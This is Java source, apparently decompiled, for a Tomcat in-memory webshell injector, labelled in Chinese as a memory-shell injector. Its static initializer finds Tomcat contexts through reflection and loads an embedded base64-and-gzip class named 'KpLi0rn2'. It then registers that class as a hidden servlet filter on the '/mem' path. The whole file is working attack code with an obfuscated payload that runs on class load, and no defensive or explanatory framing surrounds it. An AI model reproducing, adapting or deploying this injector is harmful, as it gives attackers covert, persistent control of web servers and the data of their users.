//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.demo.Static;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;

/**
 * 内存马注入器
 */
public class ReflectUtil {
    public String getUrlPattern() {
        return "/mem";
    }

    public String getClassName() {
        // 放置完整的类名
        return "KpLi0rn2";
    }

    public String getBase64String() throws IOException {
        return new String("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");

    }

    public ReflectUtil() {
        try {
            List<Object> contexts = this.getContext();
            Iterator var2 = contexts.iterator();

            while(var2.hasNext()) {
                Object context = var2.next();
                System.out.println("Context: "+context);
                Object filter = this.getFilter(context);
                System.out.println("Filter: "+filter);
                if (filter != null) {
                    System.out.println("addFilter: "+filter);
                    this.addFilter(context, filter);
                }
            }
        } catch (Exception var5) {
        }

    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        Object context = null;

        try {
            Thread[] var4 = threads;
            int var5 = threads.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                Thread thread = var4[var6];
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap childrenMap = (HashMap)getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    Iterator var9 = childrenMap.keySet().iterator();

                    while(var9.hasNext()) {
                        Object key = var9.next();
                        HashMap children = (HashMap)getFV(childrenMap.get(key), "children");
                        Iterator var12 = children.keySet().iterator();

                        while(var12.hasNext()) {
                            Object key1 = var12.next();
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }

                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                } else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext")) {
                        contexts.add(context);
                    }

                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                        contexts.add(context);
                    }
                }
            }

            return contexts;
        } catch (Exception var14) {
            throw new RuntimeException(var14);
        }
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            filter = classLoader.loadClass(this.getClassName());
            System.out.println("getFilter: "+filter);
        } catch (Exception var9) {
            System.out.println("1 catch");
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                // 不解压缩方案 有问题，原因未知
                //byte[] clazzByte = decodeBase64(this.getBase64String());
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
                System.out.println("createFilter: "+filter);
            } catch (Throwable var8) {
                var8.printStackTrace();  // 打印异常信息
            }
            //var9.printStackTrace();
        }

        return filter;
    }

    public String getFilterName(String className) {
        if (className.contains(".")) {
            int lastDotIndex = className.lastIndexOf(".");
            return className.substring(lastDotIndex + 1);
        } else {
            return className;
        }
    }

    public void addFilter(Object context, Object filter) throws InvocationTargetException, NoSuchMethodException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        ClassLoader catalinaLoader = this.getCatalinaLoader();
        String filterClassName = this.getClassName();
        String filterName = this.getFilterName(filterClassName);

        try {
            if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{filterName}) != null) {
                return;
            }
        } catch (Exception var16) {
        }

        Object filterDef;
        Object filterMap;
        try {
            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
        } catch (Exception var15) {
            try {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
            } catch (Exception var14) {
                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef", true, catalinaLoader).newInstance();
                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap", true, catalinaLoader).newInstance();
            }
        }

        try {
            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
            invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});

            Constructor[] constructors;
            try {
                invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
            } catch (Exception var12) {
                invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{this.getUrlPattern()});
                constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, catalinaLoader).getDeclaredConstructors();
            }

            try {
                invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            } catch (Exception var11) {
                invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
            }

            constructors[0].setAccessible(true);
            Object filterConfig = constructors[0].newInstance(context, filterDef);
            Map filterConfigs = (Map)getFV(context, "filterConfigs");
            filterConfigs.put(filterName, filterConfig);
        } catch (Exception var13) {
            var13.printStackTrace();
        }

    }

    public ClassLoader getCatalinaLoader() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        ClassLoader catalinaLoader = null;

        for(int i = 0; i < threads.length; ++i) {
            if (threads[i].getName().contains("ContainerBackgroundProcessor")) {
                catalinaLoader = threads[i].getContextClassLoader();
                break;
            }
        }

        return catalinaLoader;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str));
        } catch (Exception var4) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str));
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();

        while(clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var4) {
                clazz = clazz.getSuperclass();
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var11) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var9) {
                    throw new RuntimeException(var9.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            }
        }
    }

    // 静态代码块
    static {
        new ReflectUtil();
    }
}
